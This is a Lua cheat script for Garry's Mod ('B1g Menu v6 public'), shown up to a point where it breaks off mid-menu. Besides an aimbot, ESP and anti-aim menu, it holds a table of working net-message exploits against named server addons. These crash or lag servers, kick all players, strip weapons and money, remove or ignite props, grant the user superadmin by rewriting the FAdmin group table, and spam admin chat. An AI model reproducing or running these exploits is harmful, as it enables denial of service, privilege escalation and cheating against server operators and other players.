local AimbotPoints = {}
AimbotPoints[1] = {bone = "ValveBiped.Bip01_Head1"}
AimbotPoints[2] = {bone = "ValveBiped.Bip01_Neck1"}
AimbotPoints[3] = {bone = "ValveBiped.Bip01_Spine4"}
AimbotPoints[4] = {bone = "ValveBiped.Bip01_Spine2"}
AimbotPoints[5] = {bone = "ValveBiped.Bip01_Spine"}
surface.CreateFont( "Font L", {
	font = "Courier New",
	size = 18,
	weight = 300,
} )
surface.CreateFont( "Font M", {
	font = "Courier New",
	size = 15,
	weight = 300,
} )
surface.CreateFont( "Font L2", {
	font = "Verdana",
	extended = false,
	size = 12,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	shadow = true,
	antialias = true
} )
// if you're going to use this for your paste atleast give me credit :)
// CFour - /id/BordersClosed/
local pMenu = {} // functions
local pMenuVars = {
	Tabs = {},
	Sliders = {},
	CheckBoxes = {},
	Exploits = {}
} // store values to be used at a later time
local BigExploits = {}
local PI = 3.14159265359;
local Rad = 180 / PI
function pMenu.IsNetString(netstring)
	local validate,_ = pcall( net.Start, netstring )
	if validate then
		return validate;
	end
	return false;
end
function pMenu.RandomString(len)
	if len == nil then
		len = math.random(20,100)
	end
	local ret = ""
	for i=1,len do
		ret = ret..string.char(math.random(33,126)) // fist 32 of ascii is pretty much garbage, I don't want spaces so we're skipping 32.
	end                                             // also I don't think gmod uses extended ascii 
	return ret
end
BigExploits["Duel Moniez"] = {func = 
function() 
	if pMenu.IsNetString("duelrequestguiYes") then
		net.Start("duelrequestguiYes")
		net.WriteInt(-2147483648,32) // b1g 32 bit int laff -> -99999999999999999999999999999999999999999999999999999999999999999999999999999
		net.WriteEntity(table.Random( player.GetAll() ) )
		net.WriteString("Crossbow")
		net.SendToServer()
	end
end
}
BigExploits["Drugsmod remove all weapons?"] = {func = 
function() 
	if pMenu.IsNetString("drugseffect_remove") then
		net.Start("drugseffect_remove")
	    net.SendToServer()
	end
end
}
BigExploits["Drugsmod remove all money?"] = {func = 
function()
	if pMenu.IsNetString("drugs_money") then
		net.Start("drugs_money")
	    net.SendToServer()
	end
end
}
BigExploits["Drugsmod ignite all props?"] = {func = 
function() 
	if pMenu.IsNetString("drugs_ignite") then
		net.Start("drugs_ignite")
	    net.WriteString("prop_physics")
	    net.SendToServer()
	end
end
}
BigExploits["Drugsmod remove all props?"] = {func = 
function() 
	if pMenu.IsNetString("drugs_text") then
		net.Start("drugs_text")
	    net.WriteString("prop_physics")
	    net.SendToServer()
	end
end
}
BigExploits["TGN Advanced Money Printer Take Monie"] = {func = 
function()
	if pMenu.IsNetString("SyncPrinterButtons76561198056171650") then
		for _,v in pairs(ents.FindByClass("adv_moneyprinter")) do
			if v:IsValid() then
				net.Start( "SyncPrinterButtons76561198056171650" )
	            net.WriteEntity(v)
	    		net.WriteUInt(2, 4)
	    		net.SendToServer()
			end
		end
	end
end
}

BigExploits["Logging thing Kick All players?"] = {func = 
function()
	if pMenu.IsNetString("DL_Answering") then
		local function reportQuestionmark()
			for i = 1, 2000 do 
		        net.Start("DL_Answering")
		        net.SendToServer()
		    end
		end
		timer.Create(pMenu.RandomString(20),0.1,50,reportQuestionmark)
	end
end
}
BigExploits["SimplicityAC Crash Server"] = {func = 
function()
	if pMenu.IsNetString("SimplicityAC_aysent") then
		local tbl = {}
		for i=1,1000 do
			tbl[i] = i;
		end
		net.Start("SimplicityAC_aysent")
	 
	    net.WriteUInt(1, 8)
	 
	    net.WriteUInt(4294967295, 32)
	 
	    net.WriteTable(tbl)
	 
	    net.SendToServer()
	end
end
}
BigExploits["Auzlex's Teleport System Lag"] = {func = 
function()
	if pMenu.IsNetString("ATS_WARP_REMOVE_CLIENT") then
		timer.Create(pMenu.RandomString(20),0.05,6000,function()
			for k,v in pairs(player.GetAll()) do
				net.Start( "ATS_WARP_REMOVE_CLIENT" )
	 			net.WriteEntity( v )
				net.WriteString( "adminroom1" )
				net.SendToServer()
				net.Start( "ATS_WARP_FROM_CLIENT" )
				net.WriteEntity( v )
				net.WriteString( "adminroom1" )
				net.SendToServer()
				net.Start( "ATS_WARP_VIEWOWNER" )
				net.WriteEntity( v )
				net.WriteString( "adminroom1" )
				net.SendToServer()
			end
		end)
	end
end
}
BigExploits["Lagger 2"] = {func = 
function()
	if pMenu.IsNetString("CFRemoveGame") then
		timer.Create(pMenu.RandomString(20),0.02,15000,function()
			for k,v in pairs(player.GetAll()) do
				net.Start( "CFRemoveGame" )
				net.WriteFloat( math.Round( "10000\n" ) )
				net.SendToServer()
				net.Start( "CFJoinGame" )
				net.WriteFloat( math.Round( "10000\n" ) )
				net.SendToServer()
				net.Start( "CFEndGame" )
				net.WriteFloat( "10000\n" )
				net.SendToServer()
			end
		end)
	end
end
}
BigExploits["Lagger 3"] = {func = 
function()
	if pMenu.IsNetString("CreateCase") then
		timer.Create(pMenu.RandomString(20),0.02,15000,function()
			for i = 1, 300 do
				net.Start( "CreateCase" )
				net.WriteString( "tapped by b1g hack from citizenhack.me" )
  				net.SendToServer()
  			end
		end)
	end
end
}
BigExploits["Lagger 4"] = {func = 
function()
	if pMenu.IsNetString("rprotect_terminal_settings") then
		timer.Create(pMenu.RandomString(20),0.02,15000,function()
			for i = 1, 200 do
				net.Start( "rprotect_terminal_settings" )
				net.WriteEntity( LocalPlayer() )
				net.SendToServer()
  			end
		end)
	end
end
}
BigExploits["Lagger 5"] = {func = 
function()
	if pMenu.IsNetString("StackGhost") then
		timer.Create(pMenu.RandomString(20),0.02,15000,function()
			for i = 1, 8 do
		        for k,v in pairs( player.GetAll() ) do
			        net.Start( "StackGhost" )
			        net.WriteInt(69,32)
			        net.SendToServer()
			    end
			end
		end)
	end
end
}
BigExploits["Lagger 6"] = {func = 
function()
	if pMenu.IsNetString("JoinOrg") then
		timer.Create(pMenu.RandomString(20),0.02,15000,function()
			for k,v in pairs(player.GetAll()) do
				net.Start("JoinOrg")
					net.WriteEntity(LocalPlayer())
					net.WriteString("test")
				net.SendToServer()                         
		    end
		end)
	end
end
}
BigExploits["Lagger 7"] = {func = 
function()
	if pMenu.IsNetString("pac_submit") then
		timer.Create(pMenu.RandomString(20),0.02,15000,function()
			for i=1, 1800 do
				net.Start("pac_submit")
				net.SendToServer()
			end
		end)
	end
end
}

BigExploits["Lagger 8"] = {func = 
function()
	if pMenu.IsNetString("steamid2") then
		timer.Create(pMenu.RandomString(20),0.02,15000,function()
			for i = 1, 300 do
				net.Start( "steamid2" )
				net.WriteString( "S P I C Y " )
				net.SendToServer()
			end
		end)
	end
end
}
BigExploits["Lagger 9"] = {func = 
function()
	if pMenu.IsNetString("NDES_SelectedEmblem") then
		timer.Create(pMenu.RandomString(20),0.02,15000,function()
			for i=1, 2000 do
				net.Start("NDES_SelectedEmblem")
				net.WriteString("exploitcity has to be a joke they can be for real.")
				net.SendToServer()
			end
		end)
	end
end
}
BigExploits["Lagger 10"] = {func = 
function()
	if pMenu.IsNetString("join_disconnect") then
		timer.Create(pMenu.RandomString(20),0.02,15000,function()
			for i=1, 3000 do
				net.Start("join_disconnect")
				net.WriteEntity(table.Random(player.GetAll()))
				net.SendToServer()
			end
		end)
	end
end
}
BigExploits["PAC Crash Server old"] = {func = 
function()
	if pMenu.IsNetString("pac_to_contraption") then
		local tbl = {}
 
		for i=1,1000000000 do
 
			tbl[#tbl + 1] = i
 
		end
 
		net.Start("pac_to_contraption")
		 
		net.WriteTable( tbl )
		 
		net.SendToServer()
	end
end
}
BigExploits["NLRKick"] = {func = 
function()
	if pMenu.IsNetString("NLRKick") then
		for k,v in pairs(player.GetAll()) do
			if v == LocalPlayer() then
				continue;
			end
			net.Start("NLRKick")
			net.WriteEntity(v)
			net.SendToServer()
		end
	end
end
}
BigExploits["B1g Crasher"] = {func = 
function()
	if pMenu.IsNetString("Morpheus.StaffTracker") then
		timer.Create(pMenu.RandomString(20),0.02,15000,function()
			for i=1, 2000 do
                net.Start("Morpheus.StaffTracker")
                net.SendToServer()
			end
		end)
	end
end
}
BigExploits["Give superadmin"] = {func = 
function()
	if pMenu.IsNetString("pplay_deleterow") then
		local id = LocalPlayer():SteamID()
		local tbl = {}
		tbl.name = "FAdmin_PlayerGroup"
		tbl.where = {"steamid",tostring(id)}

		net.Start("pplay_deleterow")

		net.WriteTable(tbl)

		net.SendToServer()



		local tbl = {}

		tbl.tblname = "FAdmin_PlayerGroup"

		tbl.tblinfo = {tostring(id),"superadmin"}

		net.Start("pplay_addrow")

		net.WriteTable(tbl)
		net.SendToServer()
	end
end
}
BigExploits["pm spam"] = {func = 
function()
	timer.Create(pMenu.RandomString(20),5,10,function()
		for k,v in pairs(player.GetAll()) do
			if v == LocalPlayer() then
				continue;
			end
			LocalPlayer():ConCommand("ulx psay "..v:Nick().." server rekt by "..LocalPlayer():Nick())
		end
	end)
end
}
BigExploits["asay spam"] = {func = 
function()
	timer.Create(pMenu.RandomString(20),1.1,10,function()
		for i=1, ((1/FrameTime())) do
			LocalPlayer():ConCommand("ulx asay"..'"Thats pretty spicy dude lol"')
		end
	end)
end
}

function pMenu.MouseInArea(frame,minx,miny,maxx,maxy)
	local PosX,PosY = frame:GetPos()
	local posx,posy = gui.MousePos();
	return ((posx >= minx && posx <= maxx) && (posy >= miny && posy <= maxy));
end
function pMenu.DrawOutLinedRect(x,y,w,h,color)
	surface.SetDrawColor( color )
	surface.DrawOutlinedRect( x, y, w, h )
	surface.SetDrawColor( Color(255,255,255,255) )
end
function pMenu.DrawRect(x,y,w,h,color)
	surface.SetDrawColor( color )
	surface.DrawRect( x, y, w, h )
	surface.SetDrawColor( Color(255,255,255,255) )
end
function pMenu.Drawline(x,y,x2,y2,color)
	surface.SetDrawColor(color)
	surface.DrawLine(x,y,x2,y2)
	surface.SetDrawColor( Color(255,255,255,255) )
end
function pMenu.DrawCircle(X,Y,radius,numSides,color)
	local Step = PI * 2.0 / numSides;
	local old = 0;
	for a=0,PI*2.0,Step do
		local X1 = radius * math.cos(a) + X;
		local Y1 = radius * math.sin(a) + Y;
		local X2 = radius * math.cos(a + Step) + X;
		local Y2 = radius * math.sin(a + Step) + Y;
		surface.SetDrawColor( color )
		surface.DrawLine(X1, Y1, X2, Y2);
	end
end
function pMenu.DrawSlider(frame,x,y,w,h,slider,min,max,startval,round)
	if round == nil then
		round = false;
	end
	max = max - min
	if pMenuVars.Sliders[slider] == nil then
		pMenuVars.Sliders[slider] = {min = min, max = max, value = startval}
	end
	local PosX,PosY = frame:GetPos()
	local NewX,NewY = PosX + x,PosY + y
	pMenu.DrawRect(x,y,w,h,Color(12,25,34,255))
	if input.IsMouseDown(MOUSE_LEFT) && pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) then
		local MX,MY = gui.MousePos();
		local MXF,MYF = MX - NewX + x,MY - NewY + y
		if round == false then
			pMenuVars.Sliders[slider].value = math.Clamp(math.Round((((MXF - x) / w) * max + min)),min,max + min)
		else
			pMenuVars.Sliders[slider].value = math.Clamp((((MXF - x) / w) * max + min),min,max + min)
		end
	end
	local val = pMenuVars.Sliders[slider].value;
	local slid = (w - 10) / (max) * (val - min)
	pMenu.DrawRect(x + slid,y,10,h,Color(18,89,131,255))
	draw.SimpleText(val,"Font M",x + (w/2),y + 2,Color(255,255,255,255),TEXT_ALIGN_CENTER)
	pMenu.DrawOutLinedRect(x,y, w , h , Color( 0,255,255, 200 ))
end
function pMenu.DrawCheckBox(frame,x,y,CBOX,defvalue,text)
	local w,h = 20,20
	if pMenuVars.CheckBoxes[CBOX] == nil then
		pMenuVars.CheckBoxes[CBOX] = {value = defvalue,tez = 0}
	end
	local PosX,PosY = frame:GetPos()
	local NewX,NewY = PosX + x,PosY + y
	pMenu.DrawRect(x,y,w,h,Color(12,25,34,255))
	pMenu.DrawOutLinedRect(x,y,w,h,Color(0,255,255,255))
	if pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) && !pMenuVars.CheckBoxes[CBOX].value then
		pMenu.DrawRect(x + 3,y + 3,w - 6,h - 6,Color(18,59,101,255))
	end
	if input.IsMouseDown(MOUSE_LEFT) then
		pMenuVars.CheckBoxes[CBOX].tez = pMenuVars.CheckBoxes[CBOX].tez + 1
	else
		pMenuVars.CheckBoxes[CBOX].tez = 0;
	end
	if pMenuVars.CheckBoxes[CBOX].tez == 1 && pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) then
		pMenuVars.CheckBoxes[CBOX].value = !pMenuVars.CheckBoxes[CBOX].value;
	end
	if pMenuVars.CheckBoxes[CBOX].value then
		pMenu.DrawRect(x + 3,y + 3,w - 6,h - 6,Color(18,89,131,255))
	end
	draw.SimpleText(text,"Font M",x + w + 5,y + 2,Color(255,255,255,255),TEXT_ALIGN_LEFT)
end

function pMenu.DrawTab(frame,x,y,w,h,NAME,defvalue)
	if pMenuVars.Tabs[NAME] == nil then
		pMenuVars.Tabs[NAME] = {value = defvalue,tez = 0}
	end
	local PosX,PosY = frame:GetPos()
	local NewX,NewY = PosX + x,PosY + y
	pMenu.DrawRect(x,y,w,h,Color(12,25,34,255))
	if pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) && !pMenuVars.Tabs[NAME].value then
		pMenu.DrawRect(x,y,w,h,Color(18,59,101,255))
	end
	if input.IsMouseDown(MOUSE_LEFT) then
		pMenuVars.Tabs[NAME].tez = pMenuVars.Tabs[NAME].tez + 1
	else
		pMenuVars.Tabs[NAME].tez = 0;
	end
	if pMenuVars.Tabs[NAME].tez == 1 && pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) then
		pMenuVars.Tabs[NAME].value = !pMenuVars.Tabs[NAME].value;
	end
	if pMenuVars.Tabs[NAME].value then
		pMenu.DrawRect(x,y,w,h,Color(18,89,131,255))
	end
	pMenu.DrawOutLinedRect(x,y,w,h,Color(0,255,255,255))
	draw.SimpleText(NAME,"Font L",x + w/2,y + h/2,Color(255,255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
end
function pMenu.DrawExploit(frame,x,y,w,h,NAME,func,text1,text2)
	if pMenuVars.Exploits[NAME] == nil then
		pMenuVars.Exploits[NAME] = {func = func,tez = 0}
	end
	local PosX,PosY = frame:GetPos()
	local NewX,NewY = PosX + x,PosY + y
	pMenu.DrawRect(x,y,w,h,Color(12,25,34,255))
	if pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) then
		pMenu.DrawRect(x,y,w,h,Color(18,59,101,255))
	end
	if input.IsMouseDown(MOUSE_LEFT) then
		pMenuVars.Exploits[NAME].tez = pMenuVars.Exploits[NAME].tez + 1
	else
		pMenuVars.Exploits[NAME].tez = 0;
	end
	if pMenuVars.Exploits[NAME].tez == 1 && pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) then
		pMenuVars.Exploits[NAME].func();
	end
	pMenu.DrawOutLinedRect(x,y,w,h,Color(0,255,255,255))
	if text2 == nil then
		draw.SimpleText(text1,"Font M",x + w/2,y + h/2,Color(255,255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
	else
		draw.SimpleText(text1,"Font M",x + w/2,y + h/2 - 8,Color(255,255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
		draw.SimpleText(text2,"Font M",x + w/2,y + h/2 + 8,Color(255,255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
	end
end
local firsttime = true
local Frame = NULL;




function pMenu.Menu()
	Frame = vgui.Create( "DFrame" )
	Frame:SetTitle( "" )
	Frame:SetSize( 700, 500 )
	Frame:Center()
	Frame:ShowCloseButton(false)
	Frame:MakePopup()
	Frame.Paint = function( self, w, h )
		pMenu.DrawRect(0, 0, w, h, Color( 32,45,54, 230 ))
		pMenu.DrawRect(0, 0, w, 20, Color( 18,89,131, 255 ))
		pMenu.DrawOutLinedRect(0, 0, w, 20, Color( 0,255,255, 200 ))
		pMenu.DrawOutLinedRect(0, 0, w, h, Color( 0,255,255, 200 ))
		pMenu.DrawRect(5, 25, 125, h - 30, Color( 18,89,131, 100 ))
		pMenu.DrawOutLinedRect(5, 25, 125, h - 30, Color( 0,255,255, 200 ))
		pMenu.DrawOutLinedRect(135, 25, w - 140, h - 30, Color( 0,255,255, 200 ))
		draw.SimpleText("B1g Menu v6 public","Font L",w/2,1,Color(255,255,255,255),TEXT_ALIGN_CENTER)
		local Aimbot = "Aimbot";
		local Visuals = "Visuals";
		local b1gExploits = "Exploits"
		local misc = "MISC"
		local hvh = "HvH"
		pMenu.DrawTab(Frame,10,30,115,50,Aimbot,true)
		pMenu.DrawTab(Frame,10,85,115,50,Visuals,true)
		pMenu.DrawTab(Frame,10,140,115,50,b1gExploits,true)
		pMenu.DrawTab(Frame,10,195,115,50,misc,true) 
		pMenu.DrawTab(Frame,10,250,115,50,hvh,true) 
		if pMenuVars.Tabs[Visuals].value then
			pMenu.DrawCheckBox(Frame,170,55,"ESP",true,"Enable ESP")

			pMenu.Drawline(160,95,350,95,Color(0,255,255,255))

			pMenu.DrawCheckBox(Frame,150,115,"ESP Name",true,"Name")
			pMenu.DrawCheckBox(Frame,150,145,"ESP BoundingBox",true,"Bounding Box")
			pMenu.DrawCheckBox(Frame,150,175,"ESP HealthBar",true,"Health Bar")
			pMenu.DrawCheckBox(Frame,150,205,"ESP Traceline",true,"Eye Traceline")
			draw.SimpleText("Traceline Distance","Font M",150,237,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			pMenu.DrawSlider(Frame,150,265,210,20,"ESP Traceline Distance",25,  250,  71)
			pMenu.DrawCheckBox(Frame,150,295,"ESP Position",true,"Position")
			pMenu.DrawCheckBox(Frame,150,325,"ESP Angles",true,"Eye Angles")
			pMenu.DrawCheckBox(Frame,150,355,"ESP Glow",false,"Glow")
			pMenu.DrawCheckBox(Frame,150,385,"ESP Chams",false,"Chams")
			pMenu.DrawCheckBox(Frame,150,415,"ESP XQZ",false,"XQZ")
			pMenu.DrawCheckBox(Frame,150,445,"ESP WeaponCham",false,"Weapon Chams")


			draw.SimpleText("Box Color","Font M",390,35,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			draw.SimpleText("R","Font M",660,55,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			pMenu.DrawSlider(Frame,390,55,260,20,"ESP BoxColor.r",0,  255,  255)
			draw.SimpleText("G","Font M",660,80,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			pMenu.DrawSlider(Frame,390,80,260,20,"ESP BoxColor.g",0,  255,  0)
			draw.SimpleText("B","Font M",660,105,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			pMenu.DrawSlider(Frame,390,105,260,20,"ESP BoxColor.b",0,  255,  255)

			draw.SimpleText("Text Color","Font M",390,130,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			draw.SimpleText("R","Font M",660,150,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			pMenu.DrawSlider(Frame,390,150,260,20,"ESP TextColor.r",0,  255,  255)
			draw.SimpleText("G","Font M",660,175,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			pMenu.DrawSlider(Frame,390,175,260,20,"ESP TextColor.g",0,  255,  206)
			draw.SimpleText("B","Font M",660,200,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			pMenu.DrawSlider(Frame,390,200,260,20,"ESP TextColor.b",0,  255,  121)

			draw.SimpleText("Chams Visible","Font M",390,225,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			draw.SimpleText("R","Font M",660,250,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			pMenu.DrawSlider(Frame,390,250,260,20,"ESP ChamVisColor.r",0,  255,  10)
			draw.SimpleText("G","Font M",660,275,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			pMenu.DrawSlider(Frame,390,275,260,20,"ESP ChamVisColor.g",0,  255,  206)
			draw.SimpleText("B","Font M",660,300,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			pMenu.DrawSlider(Frame,390,300,260,20,"ESP ChamVisColor.b",0,  255,  4)

			draw.SimpleText("Chams Non-Visible","Font M",390,325,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			draw.SimpleText("R","Font M",660,350,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			pMenu.DrawSlider(Frame,390,350,260,20,"ESP ChamNVisColor.r",0,  255,  70)
			draw.SimpleText("G","Font M",660,375,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			pMenu.DrawSlider(Frame,390,375,260,20,"ESP ChamNVisColor.g",0,  255,  70)
			draw.SimpleText("B","Font M",660,400,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			pMenu.DrawSlider(Frame,390,400,260,20,"ESP ChamNVisColor.b",0,  255,  255)

			pMenu.Drawline(375,30,375,490,Color(0,255,255,255))
		end
		if pMenuVars.Tabs[misc].value then
			pMenu.DrawCheckBox(Frame,170,55,"MISC Thirdperson",false,"Enable ThirdPerson")
			draw.SimpleText("Distance","Font M",170,85,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			pMenu.DrawSlider(Frame,170,105,260,20,"MISC Thirdperson Distance",10,  300,  100)
			pMenu.DrawCheckBox(Frame,170,135,"MISC Bhop",false,"Enable Bunnyhop")
			pMenu.DrawCheckBox(Frame,170,165,"MISC Autostrafe",false,"Enable Autostrafe")
			pMenu.DrawCheckBox(Frame,170,195,"MISC Text to speech is fucking aids",false,"Enable Text to Speech")
		end
		if pMenuVars.Tabs[b1gExploits].value then
			if pMenu.IsNetString("duelrequestguiYes")then
				pMenu.DrawExploit(Frame,140,30,170,50,"Duel Moniez",BigExploits["Duel Moniez"].func,"Dueling","Give b1g money")
			end
			if pMenu.IsNetString("drugseffect_remove") then
				pMenu.DrawExploit(Frame,140,85,170,50,"Drugsmod remove all weapons?",BigExploits["Drugsmod remove all weapons?"].func,"Drugsmod","Strip all Weapons?")
			end
			if pMenu.IsNetString("drugs_money") then
				pMenu.DrawExploit(Frame,140,140,170,50,"Drugsmod remove all money?",BigExploits["Drugsmod remove all money?"].func,"Drugsmod","Remove all money?")
			end
			if pMenu.IsNetString("drugs_ignite") then
				pMenu.DrawExploit(Frame,140,195,170,50,"Drugsmod ignite all props?",BigExploits["Drugsmod ignite all props?"].func,"Drugsmod","ignite all props?")
			end
			if pMenu.IsNetString("drugs_text") then
				pMenu.DrawExploit(Frame,140,250,170,50,"Drugsmod remove all props?",BigExploits["Drugsmod remove all props?"].func,"Drugsmod","Remove all props?")
			end
			if pMenu.IsNetString("SyncPrinterButtons76561198056171650") then
				pMenu.DrawExploit(Frame,140,305,170,50,"TGN Advanced Money Printer Take Monie",BigExploits["TGN Advanced Money Printer Take Monie"].func,"TGN Advanced Printer","Take all money")
			end
			if pMenu.IsNetString("DL_Answering") then
				pMenu.DrawExploit(Frame,140,360,170,50,"Logging thing Kick All players?",BigExploits["Logging thing Kick All players?"].func,"Logging thing","Kick all players")
			end
			if pMenu.IsNetString("SimplicityAC_aysent") then
				pMenu.DrawExploit(Frame,140,415,170,50,"SimplicityAC Crash Server",BigExploits["SimplicityAC Crash Server"].func,"SimplicityAC","Crash Server")
			end
			if pMenu.IsNetString("ATS_WARP_REMOVE_CLIENT") then
				pMenu.DrawExploit(Frame,315,30,170,50,"Auzlex's Teleport System Lag",BigExploits["Auzlex's Teleport System Lag"].func,"Auzlex's Teleport System","Lag Server for 5 min")
			end
			if pMenu.IsNetString("CFRemoveGame") then
				pMenu.DrawExploit(Frame,315,85,170,50,"Lagger 2",BigExploits["Lagger 2"].func,"Lagger 2 (5 min)")
			end
			if pMenu.IsNetString("CreateCase") then
				pMenu.DrawExploit(Frame,315,140,170,50,"Lagger 3",BigExploits["Lagger 3"].func,"Lagger 3 (5 min)")
			end
			if pMenu.IsNetString("rprotect_terminal_settings") then
				pMenu.DrawExploit(Frame,315,195,170,50,"Lagger 4",BigExploits["Lagger 4"].func,"Lagger 4 (5 min)")
			end
			if pMenu.IsNetString("StackGhost") then
				pMenu.DrawExploit(Frame,315,250,170,50,"Lagger 5",BigExploits["Lagger 5"].func,"Lagger 5 (5 min)")
			end
			if pMenu.IsNetString("JoinOrg") then
				pMenu.DrawExploit(Frame,315,250,170,50,"Lagger 6",BigExploits["Lagger 6"].func,"Lagger 6 (5 min)")
			end
			if pMenu.IsNetString("pac_submit") then
				pMenu.DrawExploit(Frame,315,305,170,50,"Lagger 7",BigExploits["Lagger 7"].func,"Lagger 7 (5 min)")
			end
			if pMenu.IsNetString("pac_to_contraption") then
				pMenu.DrawExploit(Frame,315,360,170,50,"PAC Crash Server old",BigExploits["PAC Crash Server old"].func,"PAC (patched on some)","Crash Server")
			end
			if pMenu.IsNetString("NLRKick") then
				pMenu.DrawExploit(Frame,315,415,170,50,"NLRKick",BigExploits["NLRKick"].func,"NLR","Kick everyone (but you)")
			end
			if pMenu.IsNetString("steamid2") then
				pMenu.DrawExploit(Frame,490,30,170,50,"Lagger 8",BigExploits["Lagger 8"].func,"Lagger 8 (5min)")
			end
			if pMenu.IsNetString("NDES_SelectedEmblem") then
				pMenu.DrawExploit(Frame,490,85,170,50,"Lagger 9",BigExploits["Lagger 9"].func,"Lagger 9 (5min)")
			end
			if pMenu.IsNetString("join_disconnect") then
				pMenu.DrawExploit(Frame,490,140,170,50,"Lagger 10",BigExploits["Lagger 10"].func,"Lagger 10 (5min)")
			end
			if pMenu.IsNetString("Morpheus.StaffTracker") then
				pMenu.DrawExploit(Frame,490,195,170,50,"B1g Crasher",BigExploits["B1g Crasher"].func,"B1g Crasher")
			end
			if pMenu.IsNetString("pplay_deleterow") then
				pMenu.DrawExploit(Frame,490,250,170,50,"Give superadmin",BigExploits["Give superadmin"].func,"Give superadmin")
			end
			pMenu.DrawExploit(Frame,490,305,170,50,"pm spam",BigExploits["pm spam"].func,"rekt by me lol")
			pMenu.DrawExploit(Frame,490,360,170,50,"asay spam",BigExploits["asay spam"].func,"asay spam")
			draw.SimpleText("Thanks pExploitcity ","Font L",140,470,Color(255,255,255,255),TEXT_ALIGN_LEFT)
		end
		if pMenuVars.Tabs[Aimbot].value then
			pMenu.DrawCheckBox(Frame,170,55,"Aibmot Enable",false,"Enable")
			draw.SimpleText("Aimbot FOV","Font M",170,85,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			pMenu.DrawSlider(Frame,170,105,490,20,"Aimbot FOV",1,  360,  10,true)

			pMenu.DrawCheckBox(Frame,170,140,"Aibmot Smooth",false,"Smooth movement")
			draw.SimpleText("Smooth amount","Font M",170,170,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			pMenu.DrawSlider(Frame,170,190,225,20,"Aimbot Smooth AMT",1,  100,  5)

			pMenu.DrawCheckBox(Frame,410,140,"Aibmot Show fov circle",false,"Aibmot FOV circle (sort of accurate)")
			draw.SimpleText("Circle color","Font M",410,170,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			draw.SimpleText("R","Font M",645,190,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			pMenu.DrawSlider(Frame,410,190,225,20,"Aimbot Circle.r",1,  255,  255)
			draw.SimpleText("G","Font M",645,215,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			pMenu.DrawSlider(Frame,410,215,225,20,"Aimbot Circle.g",1,  255,  255)
			draw.SimpleText("B","Font M",645,240,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			pMenu.DrawSlider(Frame,410,240,225,20,"Aimbot Circle.b",1,  255,  1)
			draw.SimpleText("A","Font M",645,265,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			pMenu.DrawSlider(Frame,410,265,225,20,"Aimbot Circle.a",1,  255,  255) // 159

			draw.SimpleText("Aimkey (wiki.garrysmod.com/page/Enums/KEY) Default: Left Alt","Font M",170,290,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			pMenu.DrawSlider(Frame,170,315,490,20,"Aimbot Key",1,  159,  81)

			draw.SimpleText("Aimspot (default values): 1 = head, 2 = neck,3 = top of the spine","Font M",170,340,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			draw.SimpleText("4 = center spine,5 = stomach.   More can be added at the top of the code","Font M",170,360,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			pMenu.DrawSlider(Frame,170,385,490,20,"Aimbot Bone",1,  #AimbotPoints,  1)
		end
		if pMenuVars.Tabs[hvh].value then
			pMenu.DrawCheckBox(Frame,170,55,"HvH Enable",false,"Enable")
			pMenu.DrawCheckBox(Frame,170,100,"HvH Antiaim",false,"Enable AntiAim")
			draw.SimpleText("Pitch Angle","Font M",170,125,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			pMenu.DrawSlider(Frame,170,150,490,20,"HvH Pitch",-360,  360,  -180.05332,true)
			draw.SimpleText("Yaw Angle","Font M",170,175,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			pMenu.DrawSlider(Frame,170,200,490,20,"HvH Yaw",-360,  360,  -80,true)
			draw.SimpleText("Style: 1 jitter spin, 2 spin, 3 random,4 at player,5 static,6 yaw + cam.y","Font M",170,225,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			pMenu.DrawSlider(Frame,170,250,200,20,"HvH Style",1,  6,  4)
			if pMenuVars.Sliders["HvH Style"].value == 2 then
				draw.SimpleText("Spin Speed (ang  + (IntervalPerTick + Number)","Font M",380,250,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				pMenu.DrawSlider(Frame,380,275,285,20,"HvH Spin Speed",1,  1000,  235)
			elseif pMenuVars.Sliders["HvH Style"].value == 3 then
				draw.SimpleText("Random min/max","Font M",380,250,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				pMenu.DrawSlider(Frame,380,275,200,20,"HvH randomY",1,  180,  45)
			end

			pMenu.DrawCheckBox(Frame,170,310,"HvH Autoshoot",false,"Autoshoot")
